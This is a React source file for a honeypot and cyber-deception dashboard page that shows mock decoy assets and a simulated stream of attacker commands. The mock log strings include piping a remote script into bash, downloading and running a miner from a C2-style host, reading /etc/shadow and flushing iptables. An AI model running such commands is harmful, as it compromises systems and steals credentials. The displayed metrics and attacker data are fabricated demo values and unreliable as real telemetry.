"use client";

import React, { useState, useEffect } from "react";
import AppShell from "@/components/AppShell";
import { IocHoverCard } from "@/components/ui/IocHoverCard";
import { SparklineWaveform } from "@/components/ui/SparklineWaveform";
import {
  ShieldAlert,
  Terminal,
  Activity,
  Radio,
  Eye,
  Lock,
  Flame,
  CheckCircle2,
  AlertTriangle,
  Server,
  Zap,
  Copy,
  Check,
  RefreshCw,
  Ban,
  Clock,
  Sparkles,
  ExternalLink,
  Layers,
  FileCode,
  Plus
} from "lucide-react";

interface HoneypotAsset {
  id: string;
  name: string;
  type: "Honey SPN" | "SSH Trap" | "Decoy SMB" | "Canary AWS Key" | "Fake Web Portal";
  ipOrLocation: string;
  status: "ARMED & LISTENING" | "TRIPPED (LIVE INGRESS)" | "STANDBY";
  hits24h: number;
  lastAttackerIp: string;
  lastAttackerGeo: string;
  tactic: string;
}

const DECEPTION_ASSETS: HoneypotAsset[] = [
  {
    id: "decoy-spn-01",
    name: "CORP\\svc_mssql_admin (Decoy SPN)",
    type: "Honey SPN",
    ipOrLocation: "DC01.corp.internal:1433",
    status: "TRIPPED (LIVE INGRESS)",
    hits24h: 18,
    lastAttackerIp: "185.220.101.5",
    lastAttackerGeo: "Netherlands 🇳🇱",
    tactic: "T1558.003 (Kerberoasting Trap)"
  },
  {
    id: "ssh-trap-02",
    name: "DMZ-BASTION-CANARY (Cowrie SSH)",
    type: "SSH Trap",
    ipOrLocation: "192.168.10.45:22",
    status: "TRIPPED (LIVE INGRESS)",
    hits24h: 142,
    lastAttackerIp: "45.133.1.88",
    lastAttackerGeo: "Russia 🇷🇺",
    tactic: "T1110.001 (Password Brute Force)"
  },
  {
    id: "smb-share-03",
    name: "\\\\SRV-FINANCE\\Q4_Executive_Salaries$",
    type: "Decoy SMB",
    ipOrLocation: "10.0.4.50:445",
    status: "ARMED & LISTENING",
    hits24h: 3,
    lastAttackerIp: "10.0.4.18",
    lastAttackerGeo: "Internal Workstation",
    tactic: "T1021.002 (Lateral Share Probe)"
  },
  {
    id: "aws-canary-04",
    name: "AKIA_PROD_DEPLOY_BACKUP_CANARY",
    type: "Canary AWS Key",
    ipOrLocation: "AWS us-east-1 (CloudTrail)",
    status: "ARMED & LISTENING",
    hits24h: 0,
    lastAttackerIp: "N/A",
    lastAttackerGeo: "Zero Triggers",
    tactic: "T1078.004 (Cloud Credential Leak)"
  },
  {
    id: "fake-portal-05",
    name: "vpn.corp-secure-login.net (Decoy MFA Portal)",
    type: "Fake Web Portal",
    ipOrLocation: "External DMZ :443",
    status: "ARMED & LISTENING",
    hits24h: 84,
    lastAttackerIp: "194.26.29.112",
    lastAttackerGeo: "Bulgaria 🇧🇬",
    tactic: "T1566.002 (Phishing Probe)"
  }
];

const INITIAL_KEYSTROKE_LOGS = [
  { time: "13:48:02 UTC", ip: "45.133.1.88", cmd: "ssh root@192.168.10.45 [PASSWORD: admin1234] -> ACCESS GRANTED (HONEYPOT)" },
  { time: "13:48:10 UTC", ip: "45.133.1.88", cmd: "whoami -> root" },
  { time: "13:48:15 UTC", ip: "45.133.1.88", cmd: "uname -a -> Linux socforge-trap 5.15.0-x86_64" },
  { time: "13:48:22 UTC", ip: "45.133.1.88", cmd: "curl -s http://185.220.101.5/stage2.sh | bash -> PAYLOAD ISOLATED & BUFFERED" },
  { time: "13:48:30 UTC", ip: "45.133.1.88", cmd: "cat /etc/shadow -> FAKE PASSWORD HASHES DELIVERED" },
  { time: "13:48:45 UTC", ip: "45.133.1.88", cmd: "nmap -sT 192.168.0.0/24 -> INTERCEPTED BY DECEPTION FABRIC" }
];

export default function DeceptionPage() {
  const [assets, setAssets] = useState<HoneypotAsset[]>(DECEPTION_ASSETS);
  const [selectedAsset, setSelectedAsset] = useState<HoneypotAsset>(DECEPTION_ASSETS[0]);
  const [logs, setLogs] = useState(INITIAL_KEYSTROKE_LOGS);
  const [actionNotice, setActionNotice] = useState<string | null>(null);

  // Deploy Modal State
  const [deployModalOpen, setDeployModalOpen] = useState(false);
  const [newTrapName, setNewTrapName] = useState("");
  const [newTrapType, setNewTrapType] = useState<"Honey SPN" | "SSH Trap" | "Decoy SMB" | "Canary AWS Key" | "Fake Web Portal">("Honey SPN");
  const [newTrapLocation, setNewTrapLocation] = useState("");
  const [newTrapTactic, setNewTrapTactic] = useState("T1558.003 (Kerberoasting)");

  const handleDeployTrap = (e: React.FormEvent) => {
    e.preventDefault();
    if (!newTrapName.trim()) return;

    const newTrap: HoneypotAsset = {
      id: `trap-${Date.now()}`,
      name: newTrapName.trim(),
      type: newTrapType,
      ipOrLocation: newTrapLocation.trim() || "Active Directory Tier-0",
      status: "ARMED & LISTENING",
      hits24h: 0,
      lastAttackerIp: "None",
      lastAttackerGeo: "Pending Ingress",
      tactic: newTrapTactic
    };

    setAssets((prev) => [newTrap, ...prev]);
    setSelectedAsset(newTrap);
    setDeployModalOpen(false);
    setNewTrapName("");
    setNewTrapLocation("");
    setActionNotice(`Deception sensor "${newTrap.name}" successfully deployed and armed.`);
    setTimeout(() => setActionNotice(null), 4000);
  };

  const handleSimulateCanaryTrip = () => {
    const trippedIp = "194.165.16.24";
    const newLog = {
      time: new Date().toLocaleTimeString() + " UTC",
      ip: trippedIp,
      cmd: `CANARY TRIGGERED: Unauthorized probe against [${selectedAsset.name}] -> TELEMETRY CAPTURED`
    };
    setLogs((prev) => [newLog, ...prev]);
    setAssets((prev) =>
      prev.map((a) =>
        a.id === selectedAsset.id
          ? { ...a, status: "TRIPPED (LIVE INGRESS)", hits24h: a.hits24h + 1, lastAttackerIp: trippedIp, lastAttackerGeo: "Lithuania 🇱🇹" }
          : a
      )
    );
    setSelectedAsset((prev) => ({
      ...prev,
      status: "TRIPPED (LIVE INGRESS)",
      hits24h: prev.hits24h + 1,
      lastAttackerIp: trippedIp,
      lastAttackerGeo: "Lithuania 🇱🇹"
    }));
    setActionNotice(`Alert: Canary Trap [${selectedAsset.name}] tripped by ${trippedIp}!`);
    setTimeout(() => setActionNotice(null), 4000);
  };

  // Simulate live incoming attacker keystrokes
  useEffect(() => {
    const interval = setInterval(() => {
      const commands = [
        "wget http://c2-malware-repo.top/miner.elf -O /tmp/kworker",
        "chmod +x /tmp/kworker && /tmp/kworker --daemon",
        "cat /root/.ssh/authorized_keys",
        "find / -name '*.kdbx' 2>/dev/null",
        "iptables -F && echo 'Firewall flushed'",
        "ps aux | grep -i crypt"
      ];
      const randomCmd = commands[Math.floor(Math.random() * commands.length)];
      const newLog = {
        time: new Date().toLocaleTimeString() + " UTC",
        ip: "45.133.1.88",
        cmd: `${randomCmd} -> [TRAPPED BY HONEYPOT]`
      };
      setLogs((prev) => [newLog, ...prev.slice(0, 14)]);
    }, 4500);

    return () => clearInterval(interval);
  }, []);

  const handleBanAttacker = (ip: string) => {
    setActionNotice(`Attacker IP ${ip} banned across Edge Firewall & SIEM Blocklist!`);
    setTimeout(() => setActionNotice(null), 4000);
  };

  return (
    <AppShell>
      <div className="flex-1 flex flex-col min-w-0 bg-[#000000] text-neutral-100 overflow-y-auto">
        {/* Header */}
        <div className="border-b border-[#262626] bg-[#050505]/95 px-6 py-5 backdrop-blur-md flex flex-col md:flex-row md:items-center justify-between gap-4 flex-shrink-0">
          <div className="flex items-center gap-3">
            <div className="p-2.5 rounded-xl bg-purple-950/40 border border-purple-800/40 text-purple-400">
              <Eye className="w-6 h-6" />
            </div>
            <div>
              <div className="flex items-center gap-2 text-xs font-mono text-neutral-400 mb-1">
                <span>ACTIVE DEFENSE</span>
                <span>/</span>
                <span className="text-purple-400">CYBER DECEPTION & HONEYPOTS</span>
              </div>
              <h1 className="text-xl font-bold tracking-tight text-white flex items-center gap-2.5">
                Cyber Deception & Active Honeypot Studio
                <span className="px-2 py-0.5 rounded-full bg-purple-500/15 text-purple-300 border border-purple-500/30 text-[10px] font-mono">
                  5 ARMED CANARY TRAPS
                </span>
              </h1>
              <p className="text-xs text-neutral-400 mt-1">
                Deploy decoy credentials, Cowrie SSH honeypots, honey SPNs, and capture live attacker tradecraft with zero false positives.
              </p>
            </div>
          </div>

          <div className="flex items-center gap-2 text-xs font-mono">
            <button
              onClick={() => setDeployModalOpen(true)}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-purple-600 hover:bg-purple-500 text-white font-semibold shadow-md shadow-purple-600/20 transition"
            >
              <Plus className="w-3.5 h-3.5" />
              <span>Deploy Honeytoken</span>
            </button>

            <button
              onClick={handleSimulateCanaryTrip}
              className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-neutral-900 hover:bg-neutral-800 text-amber-400 border border-[#262626] font-semibold transition"
              title="Simulate attacker interaction with active decoy sensor"
            >
              <Flame className="w-3.5 h-3.5" />
              <span>Simulate Probe</span>
            </button>

            <div className="flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-[#0a0a0a] border border-[#262626] text-neutral-300">
              <Radio className="w-3.5 h-3.5 text-purple-400 animate-pulse" />
              <span>SENSORS: ARMED</span>
            </div>
          </div>
        </div>

        {/* Action Notice Toast */}
        {actionNotice && (
          <div className="bg-emerald-950/80 border-b border-emerald-500/40 px-6 py-2 text-xs font-mono text-emerald-300 flex items-center justify-between">
            <span className="flex items-center gap-2">
              <CheckCircle2 className="w-4 h-4 text-emerald-400" />
              {actionNotice}
            </span>
          </div>
        )}

        {/* KPI Metrics Matrix */}
        <div className="p-6 grid grid-cols-1 md:grid-cols-4 gap-4">
          <div className="bg-[#050505] border border-[#262626] rounded-xl p-4 relative overflow-hidden">
            <div className="flex items-center justify-between text-neutral-400 text-xs uppercase font-mono font-semibold">
              <span>Tripped Traps (24h)</span>
              <Flame className="w-4 h-4 text-rose-400" />
            </div>
            <div className="text-2xl font-bold font-mono text-white mt-1">247 <span className="text-xs text-rose-400 font-sans font-medium">+14% active</span></div>
            <div className="mt-2">
              <SparklineWaveform color="rose" height={24} />
            </div>
          </div>

          <div className="bg-[#050505] border border-[#262626] rounded-xl p-4 relative overflow-hidden">
            <div className="flex items-center justify-between text-neutral-400 text-xs uppercase font-mono font-semibold">
              <span>Active Adversary IPs</span>
              <Activity className="w-4 h-4 text-amber-400" />
            </div>
            <div className="text-2xl font-bold font-mono text-amber-400 mt-1">12 <span className="text-xs text-neutral-400 font-sans font-normal">Isolated in Sandbox</span></div>
            <div className="mt-2">
              <SparklineWaveform color="amber" height={24} />
            </div>
          </div>

          <div className="bg-[#050505] border border-[#262626] rounded-xl p-4 relative overflow-hidden">
            <div className="flex items-center justify-between text-neutral-400 text-xs uppercase font-mono font-semibold">
              <span>False Positive Ratio</span>
              <CheckCircle2 className="w-4 h-4 text-emerald-400" />
            </div>
            <div className="text-2xl font-bold font-mono text-emerald-400 mt-1">0.00% <span className="text-xs text-neutral-400 font-sans font-normal">Deterministic</span></div>
            <div className="mt-2">
              <SparklineWaveform color="emerald" height={24} />
            </div>
          </div>

          <div className="bg-[#050505] border border-[#262626] rounded-xl p-4 relative overflow-hidden">
            <div className="flex items-center justify-between text-neutral-400 text-xs uppercase font-mono font-semibold">
              <span>Canary Token Defense</span>
              <Lock className="w-4 h-4 text-purple-400" />
            </div>
            <div className="text-2xl font-bold font-mono text-purple-400 mt-1">100% <span className="text-xs text-neutral-400 font-sans font-normal">Coverage</span></div>
            <div className="mt-2">
              <SparklineWaveform color="white" height={24} />
            </div>
          </div>
        </div>

        {/* Main Workspace: Asset Inventory + Live Attacker Keystroke Terminal */}
        <div className="px-6 pb-6 grid grid-cols-1 lg:grid-cols-12 gap-6">
          {/* Left Column: Deception Decoy Fleet */}
          <div className="lg:col-span-6 space-y-4">
            <div className="flex items-center justify-between">
              <h2 className="text-xs font-semibold font-mono uppercase tracking-wider text-neutral-400 flex items-center gap-2">
                <Layers className="w-4 h-4 text-purple-400" />
                Active Deception Asset Fleet ({assets.length})
              </h2>
              <span className="text-[10px] font-mono text-neutral-500">Auto-Refreshed</span>
            </div>

            <div className="space-y-2.5">
              {assets.map((asset) => {
                const isSelected = selectedAsset.id === asset.id;
                const isTripped = asset.status.includes("TRIPPED");
                return (
                  <div
                    key={asset.id}
                    onClick={() => setSelectedAsset(asset)}
                    className={`p-4 rounded-xl border transition-all cursor-pointer ${
                      isSelected
                        ? "bg-[#0d0d0d] border-white ring-1 ring-white/10"
                        : "bg-[#050505] border-[#262626] hover:border-neutral-600"
                    }`}
                  >
                    <div className="flex items-start justify-between gap-2 mb-2">
                      <div className="space-y-0.5">
                        <div className="flex items-center gap-2">
                          <span className="px-1.5 py-0.5 rounded bg-neutral-900 border border-[#262626] text-[10px] font-mono text-purple-400 font-bold">
                            {asset.type}
                          </span>
                          <span className="font-semibold text-white text-xs">{asset.name}</span>
                        </div>
                        <div className="text-[11px] font-mono text-neutral-400">{asset.ipOrLocation}</div>
                      </div>

                      <span
                        className={`px-2 py-0.5 rounded text-[10px] font-mono font-bold border ${
                          isTripped
                            ? "bg-rose-500/15 text-rose-400 border-rose-500/30 animate-pulse"
                            : "bg-emerald-500/15 text-emerald-400 border-emerald-500/30"
                        }`}
                      >
                        {asset.status}
                      </span>
                    </div>

                    <div className="flex items-center justify-between text-xs pt-2 border-t border-[#1a1a1a]">
                      <span className="text-neutral-500 font-mono text-[11px]">
                        Target ATT&CK: <span className="text-neutral-300 font-semibold">{asset.tactic}</span>
                      </span>
                      <span className="text-neutral-400 font-mono text-[11px]">
                        Hits (24h): <strong className="text-rose-400">{asset.hits24h}</strong>
                      </span>
                    </div>

                    {isTripped && (
                      <div className="mt-2.5 p-2 rounded-lg bg-[#0a0a0a] border border-[#1f1f1f] flex items-center justify-between text-[11px] font-mono">
                        <span className="text-neutral-400">
                          Last Ingress: <IocHoverCard value={asset.lastAttackerIp} type="ip" className="text-rose-400 font-bold" /> ({asset.lastAttackerGeo})
                        </span>
                        <button
                          onClick={(e) => {
                            e.stopPropagation();
                            handleBanAttacker(asset.lastAttackerIp);
                          }}
                          className="px-2 py-0.5 rounded bg-rose-600 hover:bg-rose-500 text-white font-medium text-[10px] transition-colors"
                        >
                          Ban IP
                        </button>
                      </div>
                    )}
                  </div>
                );
              })}
            </div>
          </div>

          {/* Right Column: Live Attacker Keystroke Terminal & Payload Dissector */}
          <div className="lg:col-span-6 space-y-4">
            <div className="flex items-center justify-between">
              <h2 className="text-xs font-semibold font-mono uppercase tracking-wider text-neutral-400 flex items-center gap-2">
                <Terminal className="w-4 h-4 text-emerald-400" />
                Live Attacker Keystroke Stream (Cowrie Sandbox)
              </h2>
              <span className="flex items-center gap-1 text-[10px] font-mono text-emerald-400 animate-pulse">
                <span className="w-1.5 h-1.5 rounded-full bg-emerald-400" />
                LIVE STREAMING
              </span>
            </div>

            {/* Live Terminal Box */}
            <div className="rounded-2xl bg-[#050505] border border-[#262626] overflow-hidden flex flex-col h-[480px] shadow-2xl">
              <div className="px-4 py-2.5 bg-[#0a0a0a] border-b border-[#1f1f1f] flex items-center justify-between text-xs font-mono text-neutral-400">
                <div className="flex items-center gap-2">
                  <span className="w-2.5 h-2.5 rounded-full bg-rose-500/80" />
                  <span className="w-2.5 h-2.5 rounded-full bg-amber-500/80" />
                  <span className="w-2.5 h-2.5 rounded-full bg-emerald-500/80" />
                  <span className="ml-2 text-neutral-300 font-semibold">ssh-session-stream-45.133.1.88.log</span>
                </div>
                <span>TTY PTY/0</span>
              </div>

              {/* Terminal Output */}
              <div className="flex-1 p-4 overflow-y-auto space-y-2 font-mono text-xs text-neutral-300 leading-relaxed bg-[#000000]">
                {logs.map((item, idx) => (
                  <div key={idx} className="flex items-start gap-2 animate-in fade-in duration-200">
                    <span className="text-neutral-600 text-[10px] whitespace-nowrap pt-0.5">{item.time}</span>
                    <span className="text-purple-400 font-bold">[{item.ip}]</span>
                    <span className="text-neutral-200">{item.cmd}</span>
                  </div>
                ))}
              </div>

              {/* Terminal Footer Actions */}
              <div className="p-3 bg-[#0a0a0a] border-t border-[#1f1f1f] flex items-center justify-between">
                <div className="text-[11px] font-mono text-neutral-500">
                  Attacker commands quarantined in non-routable deception sandbox
                </div>
                <button
                  onClick={() => handleBanAttacker("45.133.1.88")}
                  className="px-3 py-1.5 rounded-lg bg-rose-600 hover:bg-rose-500 text-white font-semibold text-xs font-mono transition-colors shadow-sm"
                >
                  Isolate Attacker Subnet
                </button>
              </div>
            </div>
          </div>
        </div>

        {/* Deploy Honeytoken Modal */}
        {deployModalOpen && (
          <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/85 backdrop-blur-sm p-4">
            <div className="bg-[#050505] border border-[#262626] rounded-2xl max-w-lg w-full p-6 space-y-4 shadow-2xl">
              <div className="flex items-center justify-between pb-3 border-b border-[#262626]">
                <div className="flex items-center gap-2">
                  <div className="p-2 rounded-xl bg-purple-500/10 border border-purple-500/30 text-purple-400">
                    <Eye className="w-5 h-5" />
                  </div>
                  <div>
                    <h3 className="text-base font-bold text-white">Deploy Deception Canary Sensor</h3>
                    <p className="text-xs text-neutral-400">Arm high-fidelity honeypot trap with zero production impact</p>
                  </div>
                </div>
                <button
                  onClick={() => setDeployModalOpen(false)}
                  className="text-neutral-400 hover:text-white p-1 text-sm font-mono"
                >
                  ✕
                </button>
              </div>

              <form onSubmit={handleDeployTrap} className="space-y-3.5 text-xs font-mono">
                <div>
                  <label className="text-neutral-400 block mb-1">Honey Asset / Canary Name *</label>
                  <input
                    type="text"
                    required
                    placeholder="e.g. CORP\\svc_k8s_cluster_admin or \\\\SRV-PAYROLL\\Confidential$"
                    value={newTrapName}
                    onChange={(e) => setNewTrapName(e.target.value)}
                    className="w-full bg-[#0A0A0A] border border-[#262626] rounded-xl px-3 py-2 text-white focus:outline-none focus:border-purple-500"
                  />
                </div>

                <div className="grid grid-cols-2 gap-3">
                  <div>
                    <label className="text-neutral-400 block mb-1">Trap Technology</label>
                    <select
                      value={newTrapType}
                      onChange={(e: any) => setNewTrapType(e.target.value)}
                      className="w-full bg-[#0A0A0A] border border-[#262626] rounded-xl px-3 py-2 text-white focus:outline-none focus:border-purple-500"
                    >
                      <option value="Honey SPN">Honey SPN (Kerberoasting)</option>
                      <option value="SSH Trap">SSH Trap (Cowrie Emulation)</option>
                      <option value="Decoy SMB">Decoy SMB Share</option>
                      <option value="Canary AWS Key">Canary AWS IAM Key</option>
                      <option value="Fake Web Portal">Fake Web Portal</option>
                    </select>
                  </div>

                  <div>
                    <label className="text-neutral-400 block mb-1">Deployment Target / Host</label>
                    <input
                      type="text"
                      placeholder="e.g. 10.0.12.50:445 or AD Forest"
                      value={newTrapLocation}
                      onChange={(e) => setNewTrapLocation(e.target.value)}
                      className="w-full bg-[#0A0A0A] border border-[#262626] rounded-xl px-3 py-2 text-white focus:outline-none focus:border-purple-500"
                    />
                  </div>
                </div>

                <div>
                  <label className="text-neutral-400 block mb-1">MITRE ATT&CK Attribution</label>
                  <input
                    type="text"
                    value={newTrapTactic}
                    onChange={(e) => setNewTrapTactic(e.target.value)}
                    className="w-full bg-[#0A0A0A] border border-[#262626] rounded-xl px-3 py-2 text-white focus:outline-none focus:border-purple-500"
                  />
                </div>

                <div className="flex items-center justify-end gap-2 pt-2 border-t border-[#262626]">
                  <button
                    type="button"
                    onClick={() => setDeployModalOpen(false)}
                    className="px-4 py-2 bg-[#121212] hover:bg-[#1a1a1a] text-neutral-300 border border-[#262626] rounded-xl transition"
                  >
                    Cancel
                  </button>
                  <button
                    type="submit"
                    className="px-4 py-2 bg-purple-600 hover:bg-purple-500 text-white font-bold rounded-xl transition shadow-lg shadow-purple-600/30 flex items-center gap-1.5"
                  >
                    <CheckCircle2 className="w-3.5 h-3.5" />
                    <span>Arm Deception Trap</span>
                  </button>
                </div>
              </form>
            </div>
          </div>
        )}
      </div>
    </AppShell>
  );
}
